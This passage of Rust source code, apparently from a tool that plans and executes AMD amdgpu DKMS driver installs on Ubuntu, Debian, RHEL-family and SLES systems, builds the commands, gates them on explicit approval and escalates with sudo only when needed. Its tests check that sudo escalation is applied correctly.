    repo_version: &str,
    package_release: &str,
    dkms: bool,
    escalation: PrivilegeEscalation,
) -> Option<DriverInstallPlan> {
    let likes: Vec<String> = id_like
        .split_whitespace()
        .map(str::to_ascii_lowercase)
        .collect();
    let mentions = |family: &str| likes.iter().any(|like| like == family);

    // Ubuntu-family derivatives that reuse Ubuntu's VERSION_ID (e.g. Pop!_OS)
    // also reuse its repositories; the amdgpu apt line always targets the
    // `ubuntu/<codename>` repo, so the plan is identical to the Ubuntu base.
    // Derivatives with their own version scheme (e.g. Linux Mint's "22") do not
    // match here and remain unsupported rather than guessing a codename.
    if mentions("ubuntu") && matches!(version_id, "22.04" | "24.04") {
        let codename = if codename.is_empty() {
            codename_for_version("ubuntu", version_id)
                .unwrap_or_default()
                .to_owned()
        } else {
            codename.to_owned()
        };
        return Some(apt_driver_plan(
            os_id.to_owned(),
            version_id.to_owned(),
            codename,
            repo_version.to_owned(),
            dkms,
            true,
            escalation,
        ));
    }

    // Debian-family derivatives that share Debian's version scheme map to the
    // matching Ubuntu repo codename, exactly like the Debian base.
    if mentions("debian") && matches!(version_id, "12" | "13") {
        let repo_codename = if version_id == "13" { "noble" } else { "jammy" };
        return Some(apt_driver_plan(
            os_id.to_owned(),
            version_id.to_owned(),
            repo_codename.to_owned(),
            repo_version.to_owned(),
            dkms,
            false,
            escalation,
        ));
    }

    // Enterprise-Linux rebuilds (e.g. AlmaLinux) reuse RHEL's version scheme and
    // standard (RHCK, non-UEK) kernels, but are served from the vendor-neutral
    // `el/` repository path rather than `rhel/`. Gate strictly on `ID_LIKE`
    // naming `rhel`: Oracle Linux advertises only `ID_LIKE=fedora` and boots the
    // UEK kernel, so it must keep its dedicated `("ol", ...)` flow and never be
    // captured here with RHCK kernel commands that would fail to install. Guard
    // the `ol`/`oracle` IDs explicitly as well, in case a future OL release adds
    // `rhel` to `ID_LIKE`.
    if mentions("rhel") && !matches!(os_id, "ol" | "oracle") && is_supported_el_version(version_id)
    {
        return Some(dnf_driver_plan(
            os_id.to_owned(),
            version_id.to_owned(),
            codename.to_owned(),
            repo_version.to_owned(),
            package_release.to_owned(),
            dkms,
            DnfDriverDistro::Generic,
            escalation,
        ));
    }

    // No SUSE-family fallback: SLES is matched exactly, and community rebuilds
    // such as openSUSE Leap share the SLES version scheme but lack SUSEConnect
    // entitlements, so the SLES plan's `SUSEConnect` commands would fail. They
    // intentionally remain unsupported rather than producing a broken plan.

    None
}

/// The set of Enterprise-Linux versions AMD documents for the driver install,
/// used to gate `ID_LIKE`-based matching of RHEL rebuilds.
fn is_supported_el_version(version_id: &str) -> bool {
    matches!(version_id, "10.1" | "10.0" | "9.7" | "9.6" | "9.4" | "8.10")
}

#[derive(Debug, Clone, Copy)]
enum DnfDriverDistro {
    Rhel,
    Oracle,
    Rocky,
    /// A RHEL rebuild matched via `ID_LIKE` (e.g. AlmaLinux, CentOS Stream):
    /// standard RHEL kernels, served from the vendor-neutral `el/` repo path.
    Generic,
}

fn apt_driver_plan(
    os_id: String,
    version_id: String,
    codename: String,
    repo_version: String,
    dkms: bool,
    include_linux_modules_extra: bool,
    escalation: PrivilegeEscalation,
) -> DriverInstallPlan {
    // Empty when already root, so no command depends on a `sudo` binary that a
    // container or minimal image very likely does not have.
    let sudo = escalation.prefix();
    let mut commands = Vec::new();
    if dkms {
        commands.extend([
            driver_command(
                DriverCommandPhase::Prepare,
                &format!("{sudo}apt-get update"),
            ),
            driver_command(
                DriverCommandPhase::Prepare,
                &format!("{sudo}apt-get install -y ca-certificates curl gnupg"),
            ),
        ]);
        let header_command = if include_linux_modules_extra {
            format!(
                "{sudo}apt-get install -y \"linux-headers-$(uname -r)\" \"linux-modules-extra-$(uname -r)\""
            )
        } else {
            format!("{sudo}apt-get install -y \"linux-headers-$(uname -r)\"")
        };
        commands.push(driver_command(DriverCommandPhase::Prepare, &header_command));
        commands.extend([
            driver_command(
                DriverCommandPhase::Prepare,
                &format!("{sudo}install -m 0755 -d /etc/apt/keyrings"),
            ),
            driver_command(
                DriverCommandPhase::Prepare,
                &format!(
                    "curl -fsSL https://repo.radeon.com/rocm/rocm.gpg.key | {sudo}gpg --dearmor -o /etc/apt/keyrings/rocm.gpg"
                ),
            ),
            driver_command(
                DriverCommandPhase::Prepare,
                &format!(
                    "printf '%s\\n' 'deb [arch=amd64 signed-by=/etc/apt/keyrings/rocm.gpg] https://repo.radeon.com/graphics/{repo_version}/ubuntu {codename} main' | {sudo}tee /etc/apt/sources.list.d/amdgpu.list >/dev/null"
                ),
            ),
            driver_command(
                DriverCommandPhase::Prepare,
                &format!(
                    "printf '%s\\n' 'Package: *' 'Pin: release o=repo.radeon.com' 'Pin-Priority: 600' | {sudo}tee /etc/apt/preferences.d/rocm-pin-600 >/dev/null"
                ),
            ),
            driver_command(DriverCommandPhase::Prepare, &format!("{sudo}apt-get update")),
        ]);
        commands.push(driver_command(
            DriverCommandPhase::Execute,
            &format!("{sudo}apt-get install -y amdgpu-dkms"),
        ));
        commands.extend([
            driver_command(DriverCommandPhase::Verify, "dkms status amdgpu"),
            driver_command(DriverCommandPhase::Verify, "test -e /dev/kfd"),
            driver_command(
                DriverCommandPhase::Verify,
                "ls /dev/dri/renderD* >/dev/null",
            ),
        ]);
    }

    DriverInstallPlan {
        supported: true,
        mutating: dkms,
        policy: "linux_official_amd_dkms_wrapper".to_owned(),
        os_id,
        version_id,
        codename,
        repo_version,
        reason: if dkms {
            "Plan uses AMD's package-manager DKMS flow and requires explicit approval before execution."
        } else {
            "DKMS was not requested; this is a non-mutating preflight plan."
        }
        .to_owned(),
        preflight_checks: if dkms {
            let mut checks = driver_root_preflight_checks(escalation);
            checks.push("`apt-get` package manager is available".to_owned());
            checks
        } else {
            Vec::new()
        },
        commands,
        checks: vec![
            "dkms status amdgpu".to_owned(),
            "/sys/module/amdgpu".to_owned(),
            "/dev/kfd".to_owned(),
            "/dev/dri/renderD*".to_owned(),
            "amd-smi version if present".to_owned(),
            "rocminfo if present".to_owned(),
        ],
        // Kernel module: not live until the machine comes back up.
        reboot_required: true,
    }
}

// Same shape as the other distro plan builders: a flat list of resolved facts
// the command templates read, one of which is now the escalation prefix.
#[allow(clippy::too_many_arguments)]
fn dnf_driver_plan(
    os_id: String,
    version_id: String,
    codename: String,
    repo_version: String,
    package_release: String,
    dkms: bool,
    distro: DnfDriverDistro,
    escalation: PrivilegeEscalation,
) -> DriverInstallPlan {
    // Empty when already root, so no command depends on a `sudo` binary that a
    // container or minimal image very likely does not have.
    let sudo = escalation.prefix();
    let mut commands = Vec::new();
    if dkms {
        match distro {
            DnfDriverDistro::Rhel | DnfDriverDistro::Generic => {
                commands.extend(
                    rhel_kernel_prepare_commands(&version_id, escalation)
                        .into_iter()
                        .map(|command| driver_command(DriverCommandPhase::Prepare, &command)),
                );
            }
            DnfDriverDistro::Oracle => {
                commands.push(driver_command(
                    DriverCommandPhase::Prepare,
                    &format!("{sudo}dnf install -y \"kernel-uek-devel-$(uname -r)\""),
                ));
            }
            DnfDriverDistro::Rocky => {
                commands.push(driver_command(
                    DriverCommandPhase::Prepare,
                    &format!(
                        "{sudo}dnf install -y kernel-headers kernel-devel kernel-devel-matched"
                    ),
                ));
            }
        }
        commands.push(driver_command(
            DriverCommandPhase::Prepare,
            &format!(
                "{sudo}dnf install -y {}",
                amdgpu_install_rpm_url(&repo_version, &package_release, &version_id, distro)
            ),
        ));
        commands.push(driver_command(
            DriverCommandPhase::Prepare,
            &format!("{sudo}dnf clean all"),
        ));
        commands.push(driver_command(
            DriverCommandPhase::Execute,
            &format!("{sudo}dnf install -y amdgpu-dkms"),
        ));
        commands.extend([
            driver_command(DriverCommandPhase::Verify, "dkms status amdgpu"),
            driver_command(DriverCommandPhase::Verify, "test -e /dev/kfd"),
            driver_command(
                DriverCommandPhase::Verify,
                "ls /dev/dri/renderD* >/dev/null",
            ),
        ]);
    }

    DriverInstallPlan {
        supported: true,
        mutating: dkms,
        policy: "linux_official_amd_dkms_wrapper".to_owned(),
        os_id,
        version_id,
        codename,
        repo_version,
        reason: if dkms {
            "Plan uses AMD's documented DNF DKMS flow and requires explicit approval before execution."
        } else {
            "DKMS was not requested; this is a non-mutating preflight plan."
        }
        .to_owned(),
        preflight_checks: if dkms {
            let mut checks = driver_root_preflight_checks(escalation);
            checks.push("`dnf` package manager is available".to_owned());
            checks.push(
                "enterprise Linux repositories are registered and current before approval"
                    .to_owned(),
            );
            checks
        } else {
            Vec::new()
        },
        commands,
        checks: vec![
            "dkms status amdgpu".to_owned(),
            "/sys/module/amdgpu".to_owned(),
            "/dev/kfd".to_owned(),
            "/dev/dri/renderD*".to_owned(),
            "amd-smi version if present".to_owned(),
            "rocminfo if present".to_owned(),
        ],
        // Kernel module: not live until the machine comes back up.
        reboot_required: true,
    }
}

fn sles_driver_plan(
    os_id: String,
    version_id: String,
    codename: String,
    repo_version: String,
    package_release: String,
    dkms: bool,
    escalation: PrivilegeEscalation,
) -> DriverInstallPlan {
    // Empty when already root, so no command depends on a `sudo` binary that a
    // container or minimal image very likely does not have.
    let sudo = escalation.prefix();
    let mut commands = Vec::new();
    if dkms {
        commands.extend([
            driver_command(
                DriverCommandPhase::Prepare,
                &format!(
                    "{sudo}SUSEConnect -p sle-module-desktop-applications/{version_id}/x86_64"
                ),
            ),
            driver_command(
                DriverCommandPhase::Prepare,
                &format!("{sudo}SUSEConnect -p sle-module-development-tools/{version_id}/x86_64"),
            ),
            driver_command(
                DriverCommandPhase::Prepare,
                &format!("{sudo}SUSEConnect -p PackageHub/{version_id}/x86_64"),
            ),
            driver_command(
                DriverCommandPhase::Prepare,
                &format!("{sudo}zypper refresh"),
            ),
            driver_command(
                DriverCommandPhase::Prepare,
                &format!("{sudo}zypper install -y kernel-default-devel"),
            ),
            driver_command(
                DriverCommandPhase::Prepare,
                &format!(
                    "{sudo}zypper --no-gpg-checks install -y {}",
                    amdgpu_install_sles_rpm_url(&repo_version, &package_release, &version_id)
                ),
            ),
            driver_command(
                DriverCommandPhase::Prepare,
                &format!("{sudo}zypper refresh"),
            ),
            driver_command(
                DriverCommandPhase::Execute,
                &format!("{sudo}zypper install -y amdgpu-dkms"),
            ),
            driver_command(DriverCommandPhase::Verify, "dkms status amdgpu"),
            driver_command(DriverCommandPhase::Verify, "test -e /dev/kfd"),
            driver_command(
                DriverCommandPhase::Verify,
                "ls /dev/dri/renderD* >/dev/null",
            ),
        ]);
    }

    DriverInstallPlan {
        supported: true,
        mutating: dkms,
        policy: "linux_official_amd_dkms_wrapper".to_owned(),
        os_id,
        version_id,
        codename,
        repo_version,
        reason: if dkms {
            "Plan uses AMD's documented SLES DKMS flow and requires explicit approval before execution."
        } else {
            "DKMS was not requested; this is a non-mutating preflight plan."
        }
        .to_owned(),
        preflight_checks: if dkms {
            let mut checks = driver_root_preflight_checks(escalation);
            checks.push("`zypper` package manager is available".to_owned());
            checks.push(
                "`SUSEConnect` is available and the host is registered before approval".to_owned(),
            );
            checks
        } else {
            Vec::new()
        },
        commands,
        checks: vec![
            "dkms status amdgpu".to_owned(),
            "/sys/module/amdgpu".to_owned(),
            "/dev/kfd".to_owned(),
            "/dev/dri/renderD*".to_owned(),
            "amd-smi version if present".to_owned(),
            "rocminfo if present".to_owned(),
        ],
        // Kernel module: not live until the machine comes back up.
        reboot_required: true,
    }
}

fn rhel_kernel_prepare_commands(version_id: &str, escalation: PrivilegeEscalation) -> Vec<String> {
    let sudo = escalation.prefix();
    if version_id.starts_with("8.") {
        vec![
            format!("{sudo}dnf install -y \"kernel-headers-$(uname -r)\""),
            format!("{sudo}dnf install -y \"kernel-devel-$(uname -r)\""),
        ]
    } else {
        vec![
            format!("{sudo}dnf install -y \"kernel-headers-$(uname -r)\""),
            format!("{sudo}dnf install -y \"kernel-devel-$(uname -r)\""),
            format!("{sudo}dnf install -y \"kernel-devel-matched-$(uname -r)\""),
        ]
    }
}

fn amdgpu_install_rpm_url(
    repo_version: &str,
    package_release: &str,
    version_id: &str,
    distro: DnfDriverDistro,
) -> String {
    let repo_family = match distro {
        DnfDriverDistro::Rhel => "rhel",
        DnfDriverDistro::Oracle | DnfDriverDistro::Rocky | DnfDriverDistro::Generic => "el",
    };
    let repo_version_path = dnf_repo_version_path(version_id);
    let el_major = linux_major_version(version_id);
    format!(
        "https://repo.radeon.com/amdgpu-install/{repo_version}/{repo_family}/{repo_version_path}/amdgpu-install-{repo_version}.{package_release}-1.el{el_major}.noarch.rpm"
    )
}

fn amdgpu_install_sles_rpm_url(
    repo_version: &str,
    package_release: &str,
    version_id: &str,
) -> String {
    format!(
        "https://repo.radeon.com/amdgpu-install/{repo_version}/sle/{version_id}/amdgpu-install-{repo_version}.{package_release}-1.noarch.rpm"
    )
}

fn dnf_repo_version_path(version_id: &str) -> String {
    // AMD serves EL 8 and 10 from a major-version path (el8/, el10/, rhel/10/),
    // but EL 9 from the point-release path (el/9.7/, rhel/9.6/). Keying on the
    // major version keeps this correct for RHEL, Oracle Linux, and ID_LIKE-matched
    // rebuilds alike, without depending on the specific distro `ID`.
    let major = linux_major_version(version_id);
    match major {
        "8" | "10" => major.to_owned(),
        _ => version_id.to_owned(),
    }
}

fn linux_major_version(version_id: &str) -> &str {
    version_id.split('.').next().unwrap_or(version_id)
}

/// Preconditions about reaching root for a driver plan.
///
/// These differ by escalation: a plan that will prefix `sudo` additionally
/// depends on a `sudo` binary being installed, while a plan built as root does
/// not. Listing that precondition when already root would state a requirement
/// the plan is not relying on — which is exactly the contradiction that made
/// the unconditional prefix confusing to debug.
fn driver_root_preflight_checks(escalation: PrivilegeEscalation) -> Vec<String> {
    let mut checks =
        vec!["root access: run as root, or ensure `sudo -v` succeeds before approval".to_owned()];
    if escalation.needs_sudo_binary() {
        checks.push("`sudo` command is available when not running as root".to_owned());
    }
    checks
}

fn driver_command(phase: DriverCommandPhase, command: &str) -> DriverPlanCommand {
    DriverPlanCommand {
        phase,
        command: command.to_owned(),
    }
}

/// Resolve a `${VAR:-default}` shell parameter-expansion template to its
/// effective value: the value of `VAR` when it is set and non-empty (matching
/// the shell `:-` semantics), otherwise the literal default. This is resolved
/// once at plan-build time so the concrete value is baked into both the
/// human-readable summary and the commands the plan runs, rather than leaking an
/// unexpanded `${...}` placeholder into user-facing output or depending on the
/// runtime shell — which, for the single-quoted apt `sources.list` line, would
/// never expand it at all.
///
/// Only a single, flat `${VAR:-default}` template is recognized. Anything else —
/// a bare `${VAR}`, a `${VAR:=x}`/`${VAR-x}` form, or a nested default such as
/// `${A:-${B:-x}}` whose default itself contains `${` — is returned unchanged, so
/// an unresolvable shape degrades to its literal input rather than to a
/// half-resolved string.
fn resolve_shell_default_template(expr: &str) -> String {
    let Some(inner) = expr.strip_prefix("${").and_then(|s| s.strip_suffix('}')) else {
        return expr.to_owned();
    };
    let Some((var, default)) = inner.split_once(":-") else {
        return expr.to_owned();
    };
    if default.contains("${") {
        // Nested or embedded templates are beyond this flat matcher; return the
        // input untouched rather than emitting a partially resolved string.
        return expr.to_owned();
    }
    std::env::var(var)
        .ok()
        .filter(|value| !value.is_empty())
        .unwrap_or_else(|| default.to_owned())
}

fn render_driver_install_plan(plan: &DriverInstallPlan, yes: bool, dry_run: bool) -> String {
    let mut output = String::new();
    let _ = writeln!(output, "driver install plan");
    let _ = writeln!(output, "  policy: {}", plan.policy);
    let _ = writeln!(output, "  supported: {}", plan.supported);
    let _ = writeln!(output, "  mutating: {}", plan.mutating);
    let _ = writeln!(
        output,
        "  approval: {}",
        driver_plan_approval_label(plan, yes, dry_run)
    );
    let _ = writeln!(output, "  dry_run: {dry_run}");
    let _ = writeln!(output, "  os_id: {}", empty_as_unknown(&plan.os_id));
    let _ = writeln!(
        output,
        "  version_id: {}",
        empty_as_unknown(&plan.version_id)
    );
    let _ = writeln!(output, "  codename: {}", empty_as_unknown(&plan.codename));
    let _ = writeln!(output, "  repo_version: {}", plan.repo_version);
    let _ = writeln!(output, "  reason: {}", plan.reason);
    if !plan.preflight_checks.is_empty() {
        let _ = writeln!(output, "  preflight_checks:");
        for check in &plan.preflight_checks {
            let _ = writeln!(output, "    {check}");
        }
    }
    let execution_commands = plan
        .commands
        .iter()
        .filter(|command| {
            matches!(
                command.phase,
                DriverCommandPhase::Prepare | DriverCommandPhase::Execute
            )
        })
        .collect::<Vec<_>>();
    if execution_commands.is_empty() {
        let _ = writeln!(output, "  execution_commands: <none>");
    } else {
        let _ = writeln!(output, "  execution_commands:");
        for command in execution_commands {
            let _ = writeln!(output, "    {:?}: {}", command.phase, command.command);
        }
    }
    let verification_commands = plan
        .commands
        .iter()
        .filter(|command| command.phase == DriverCommandPhase::Verify)
        .collect::<Vec<_>>();
    // A plan that changes nothing kernel-side is live as soon as it finishes, so
    // labelling its checks "post_reboot" would tell the user to reboot for
    // nothing — and would contradict the `reboot_required: false` this same plan
    // reports after executing.
    let checks_label = if plan.reboot_required {
        "post_reboot"
    } else {
        "post_install"
    };
    if !verification_commands.is_empty() {
        let _ = writeln!(output, "  {checks_label}_check_commands:");
        for command in verification_commands {
            let _ = writeln!(output, "    {}", command.command);
        }
    }
    if !plan.checks.is_empty() {
        let _ = writeln!(output, "  {checks_label}_checks:");
        for check in &plan.checks {
            let _ = writeln!(output, "    {check}");
        }
    }
    if plan.supported && plan.mutating && !yes && !dry_run {
        let _ = writeln!(
            output,
            "  action: rerun with --yes after reviewing this plan, or approve from the TUI"
        );
    } else if plan.supported && plan.mutating && dry_run {
        let _ = writeln!(
            output,
            "  action: dry run only; no driver commands executed"
        );
    } else if plan.supported && !plan.mutating {
        let _ = writeln!(
            output,
            "  action: no driver commands will be executed; add --dkms to plan a native DKMS driver install"
        );
    } else if !plan.supported {
        let _ = writeln!(output, "  action: no driver commands will be executed");
    }
    output
}

const fn driver_plan_approval_label(
    plan: &DriverInstallPlan,
    yes: bool,
    dry_run: bool,
) -> &'static str {
    if !plan.supported || !plan.mutating || dry_run {
        "not required"
    } else if yes {
        "approved"
    } else {
        "required"
    }
}

fn codename_for_version(os_id: &str, version_id: &str) -> Option<&'static str> {
    match (os_id, version_id) {
        ("ubuntu", "22.04") => Some("jammy"),
        ("ubuntu", "24.04") => Some("noble"),
        ("debian", "12") => Some("jammy"),
        ("debian", "13") => Some("noble"),
        _ => None,
    }
}

fn run_driver_shell_command(command: &str) -> Result<()> {
    run_shell_command_with_stdin(command, Stdio::null())
}

/// Run a hardcoded shell command, wiring its stdin to `stdin`.
///
/// Most install commands run with a null stdin, but privileged commands that may
/// trigger an interactive `sudo` password prompt (such as the OpenMPI install
/// approved with `--yes`) must inherit the terminal so the user can respond.
fn run_shell_command_with_stdin(command: &str, stdin: Stdio) -> Result<()> {
    let (program, args) = shell_command_for_host(command);
    let status = ProcessCommand::new(program)
        .args(args)
        .stdin(stdin)
        .status()
        .with_context(|| format!("failed to launch `{command}`"))?;
    if !status.success() {
        bail!("`{command}` exited with {status}");
    }
    Ok(())
}

fn driver_install_state_path(paths: &AppPaths) -> PathBuf {
    paths.data_dir.join("driver").join("state.json")
}

fn write_driver_install_state(paths: &AppPaths, state: &DriverInstallState) -> Result<()> {
    let path = driver_install_state_path(paths);
    let parent = path.parent().context("driver state path has no parent")?;
    fs::create_dir_all(parent)?;
    fs::write(&path, serde_json::to_vec_pretty(state)?)?;
    Ok(())
}

fn read_driver_install_state(paths: &AppPaths) -> Result<Option<DriverInstallState>> {
    let path = driver_install_state_path(paths);
    if !path.is_file() {
        return Ok(None);
    }
    let bytes = fs::read(&path).with_context(|| format!("failed to read {}", path.display()))?;
    let state = serde_json::from_slice(&bytes)
        .with_context(|| format!("failed to parse {}", path.display()))?;
    Ok(Some(state))
}

fn current_boot_id() -> Option<String> {
    fs::read_to_string("/proc/sys/kernel/random/boot_id")
        .ok()
        .map(|value| value.trim().to_owned())
        .filter(|value| !value.is_empty())
}

fn driver_reboot_observed(executed_boot_id: Option<&str>) -> bool {
    let Some(executed_boot_id) = executed_boot_id else {
        return false;
    };
    current_boot_id()
        .as_deref()
        .is_some_and(|current| current != executed_boot_id)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::tests::{ScopedTestEnv, test_paths};
    #[cfg(unix)]
    use std::path::Path;

    fn test_examine(os: &str, wsl: bool) -> ExamineSummary {
        ExamineSummary {
            os: os.to_owned(),
            arch: "x86_64".to_owned(),
            kernel: Some("6.8.0-test".to_owned()),
            distro: Some("test distro".to_owned()),
            cpu: Some("AMD Ryzen".to_owned()),
            system_ram_gib: Some(64.0),
            interactive_terminal: false,
            default_engine: "vllm".to_owned(),
            detected_gfx_target: Some("gfx1201".to_owned()),
            compatible_therock_family: Some("gfx120X-all".to_owned()),
            detected_therock_family: None,
            driver: rocm_core::DriverSummary {
                policy: "linux_official_amd_dkms_wrapper".to_owned(),
                status: "amdgpu_missing".to_owned(),
                detail: Some("/dev/kfd missing".to_owned()),
            },
            legacy_rocm: rocm_core::LegacyRocmSummary {
                status: "not_detected".to_owned(),
                paths: Vec::new(),
                detail: None,
                version: None,
            },
            wsl: wsl.then_some(rocm_core::WslSummary {
                is_wsl: true,
                dxg_device: true,
                dxcore: true,
                librocdxg: false,
                rocdxg_dids: false,
                ldconfig_librocdxg: false,
                rocminfo: false,
                cargo: false,
                detail: Some("missing librocdxg".to_owned()),
            }),
            managed_runtime_count: 0,
            managed_service_count: 0,
            model_cache_entries: 0,
            config_dir: PathBuf::from("/tmp/config"),
            data_dir: PathBuf::from("/tmp/data"),
            cache_dir: PathBuf::from("/tmp/cache"),
        }
    }

    /// Every distro whose plan actually emits privileged commands, so the
    /// escalation tests below sweep all of them rather than whichever one was
    /// remembered. Adding a distro to the planner without adding it here would
    /// leave its commands unswept.
    fn dkms_planning_os_releases() -> Vec<(&'static str, &'static str)> {
        vec![
            (
                "ubuntu",
                "ID=ubuntu\nVERSION_ID=\"24.04\"\nVERSION_CODENAME=noble\n",
            ),
            ("debian", "ID=debian\nVERSION_ID=\"12\"\n"),
            ("rhel", "ID=rhel\nVERSION_ID=\"9.7\"\n"),
            ("rhel-8", "ID=rhel\nVERSION_ID=\"8.10\"\n"),
            ("oracle", "ID=ol\nVERSION_ID=\"9.7\"\n"),
            ("rocky", "ID=rocky\nVERSION_ID=\"9.4\"\n"),
            ("sles", "ID=sles\nVERSION_ID=\"15.7\"\n"),
            (
                "almalinux-via-id-like",
                "ID=almalinux\nVERSION_ID=\"9.4\"\nID_LIKE=\"rhel centos fedora\"\n",
            ),
        ]
    }

    fn plan_commands(os_release: &str, escalation: PrivilegeEscalation) -> Vec<String> {
        build_driver_install_plan(&test_examine("linux", false), os_release, true, escalation)
            .commands
            .into_iter()
            .map(|command| command.command)
            .collect()
    }

    #[test]
    fn driver_plan_as_root_never_emits_sudo() {
        // The defect: every command was prefixed `sudo` unconditionally, so on a
        // root host without the binary the first one died with `sudo: not found`
        // before any driver work. This asserts the ABSENCE of `sudo` across every
        // distro rather than checking known commands one by one — a templating
        // site missed on some distro fails here instead of shipping.
        for (label, os_release) in dkms_planning_os_releases() {
            let commands = plan_commands(os_release, PrivilegeEscalation::AlreadyRoot);
            assert!(
                !commands.is_empty(),
                "{label}: expected a dkms plan to emit commands"
            );
            for command in &commands {
                assert!(
                    !command.contains("sudo"),
                    "{label}: a plan built as root must not invoke sudo, got `{command}`"
                );
            }
        }
    }

    #[test]
    fn driver_plan_off_root_still_escalates_every_privileged_command() {
        // The other half of the contract: dropping `sudo` when root must not drop
        // it when a normal user runs the same plan. Verify-phase commands are
        // read-only probes and are deliberately unprivileged, so only the
        // mutating phases are required to escalate.
        for (label, os_release) in dkms_planning_os_releases() {
            let plan = build_driver_install_plan(
                &test_examine("linux", false),
                os_release,
                true,
                PrivilegeEscalation::Sudo,
            );
            let privileged: Vec<&DriverPlanCommand> = plan
                .commands
                .iter()
                .filter(|command| {
                    matches!(
                        command.phase,
                        DriverCommandPhase::Prepare | DriverCommandPhase::Execute
                    )
                })
                .collect();
            assert!(!privileged.is_empty(), "{label}: expected privileged steps");
            for command in privileged {
                assert!(
                    command.command.contains("sudo "),
                    "{label}: a plan built off root must escalate, got `{}`",
                    command.command
                );
            }
        }
    }

    #[test]
    fn driver_plan_as_root_keeps_shell_pipelines_intact() {
        // `sudo` also appears mid-pipeline (`| sudo tee`, `| sudo gpg`), which a
        // naive "strip a leading prefix" fix would miss. The pipeline must survive
        // with the escalation removed from the right-hand side only.
        let ubuntu = "ID=ubuntu\nVERSION_ID=\"24.04\"\nVERSION_CODENAME=noble\n";
        let commands = plan_commands(ubuntu, PrivilegeEscalation::AlreadyRoot);
        assert!(
            commands
                .iter()
                .any(|command| command.contains("| tee /etc/apt/sources.list.d/amdgpu.list")),
            "the apt-source pipeline must still tee, unprefixed: {commands:?}"
        );
        assert!(
            commands
                .iter()
                .any(|command| command.contains("| gpg --dearmor -o /etc/apt/keyrings/rocm.gpg")),
            "the keyring pipeline must still call gpg, unprefixed: {commands:?}"
        );
    }

    #[test]
    fn driver_plan_records_the_commands_it_will_actually_run() {
        // `execution_commands()` is what lands in state.json. It must agree with
        // the escalation the plan was built under, or the recorded history
        // describes commands that never ran.
        let ubuntu = "ID=ubuntu\nVERSION_ID=\"24.04\"\nVERSION_CODENAME=noble\n";
        let as_root = build_driver_install_plan(
            &test_examine("linux", false),
            ubuntu,
            true,
            PrivilegeEscalation::AlreadyRoot,
        );
        assert!(
            as_root
                .execution_commands()
                .iter()
                .all(|command| !command.contains("sudo")),
            "state.json must not record sudo commands for a root run"
        );
        let off_root = build_driver_install_plan(
            &test_examine("linux", false),
            ubuntu,
            true,
            PrivilegeEscalation::Sudo,
        );
        assert!(
            off_root
                .execution_commands()
                .iter()
                .all(|command| command.contains("sudo ")),
            "state.json must record the sudo commands a non-root run performs"
        );
    }

    #[test]
    fn driver_plan_as_root_drops_the_sudo_binary_precondition() {
        // The preflight claimed `sudo` must be installed even when the plan no
        // longer uses it — the same contradiction the bug report called out
        // between the stated preconditions and what execution actually did.
        for (label, os_release) in dkms_planning_os_releases() {
            let as_root = build_driver_install_plan(
                &test_examine("linux", false),
                os_release,
                true,
                PrivilegeEscalation::AlreadyRoot,
            );
            assert!(
                !as_root
                    .preflight_checks
                    .iter()
                    .any(|check| check.contains("`sudo` command is available")),
                "{label}: a root plan must not require a sudo binary: {:?}",
                as_root.preflight_checks
            );
            let off_root = build_driver_install_plan(
                &test_examine("linux", false),
                os_release,
                true,
                PrivilegeEscalation::Sudo,
            );
            assert!(
                off_root
                    .preflight_checks
                    .iter()
                    .any(|check| check.contains("`sudo` command is available")),
                "{label}: a non-root plan still depends on a sudo binary"
            );
        }
    }

    #[test]
    fn driver_plan_ubuntu_2404_uses_official_dkms_commands() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        let os_release = r#"
ID=ubuntu
VERSION_ID="24.04"
VERSION_CODENAME=noble
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let commands = plan
            .commands
            .iter()
            .map(|command| command.command.as_str())
            .collect::<Vec<_>>();

        assert!(plan.supported);
        assert!(plan.mutating);
        assert_eq!(plan.policy, "linux_official_amd_dkms_wrapper");
        assert!(
            plan.preflight_checks
                .iter()
                .any(|check| check.contains("sudo -v"))
        );
        assert!(
            commands
                .iter()
                .any(|command| command.contains("linux-headers-$(uname -r)"))
        );
        assert!(
            commands
                .iter()
                .any(|command| command.contains("linux-modules-extra-$(uname -r)"))
        );
        assert!(
            commands
                .iter()
                .any(|command| command.contains("repo.radeon.com/graphics"))
        );
        assert!(
            commands
                .iter()
                .any(|command| command.contains("amdgpu-dkms"))
        );
        let rendered = render_driver_install_plan(&plan, false, false);
        assert!(rendered.contains("approval: required"));
        assert!(rendered.contains("preflight_checks:"));
        assert!(rendered.contains("root access: run as root, or ensure `sudo -v` succeeds"));
        assert!(rendered.contains("execution_commands:"));
        assert!(rendered.contains("Prepare: sudo apt-get update"));
        assert!(rendered.contains("Execute: sudo apt-get install -y amdgpu-dkms"));
        assert!(rendered.contains("post_reboot_check_commands:"));
        assert!(rendered.contains("dkms status amdgpu"));
        assert!(rendered.contains("rerun with --yes"));
    }

    #[test]
    fn driver_plan_executor_runs_verify_after_execute() -> Result<()> {
        let mut plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        plan.commands = vec![
            driver_command(DriverCommandPhase::Prepare, "prepare"),
            driver_command(DriverCommandPhase::Execute, "execute"),
            driver_command(DriverCommandPhase::Verify, "verify"),
        ];
        let mut state = DriverInstallState {
            approved_at_unix_ms: 1,
            executed_at_unix_ms: None,
            pre_driver: test_examine("linux", true).driver,
            post_driver: None,
            boot_id_at_execution: Some("boot".to_owned()),
            reboot_required: plan.reboot_required,
            reboot_observed: false,
            commands: plan.execution_commands(),
            reconciled_at_unix_ms: None,
            reconciliation: None,
        };
        let mut observed = Vec::new();

        execute_driver_install_plan(
            &plan,
            &mut state,
            |command| {
                observed.push(command.to_owned());
                Ok(())
            },
            |_| Ok(()),
            || Ok(test_examine("linux", true).driver),
        )?;

        assert_eq!(observed, ["prepare", "execute", "verify"]);
        assert!(state.executed_at_unix_ms.is_some());
        Ok(())
    }

    #[test]
    fn driver_plan_executor_defers_verify_when_reboot_is_required() -> Result<()> {
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            "ID=ubuntu\nVERSION_ID=\"24.04\"\nVERSION_CODENAME=noble\n",
            true,
            PrivilegeEscalation::Sudo,
        );
        assert!(plan.reboot_required);
        let expected = plan.execution_commands();
        let verify_commands = plan
            .commands
            .iter()
            .filter(|command| command.phase == DriverCommandPhase::Verify)
            .map(|command| command.command.clone())
            .collect::<Vec<_>>();
        let mut state = DriverInstallState {
            approved_at_unix_ms: 1,
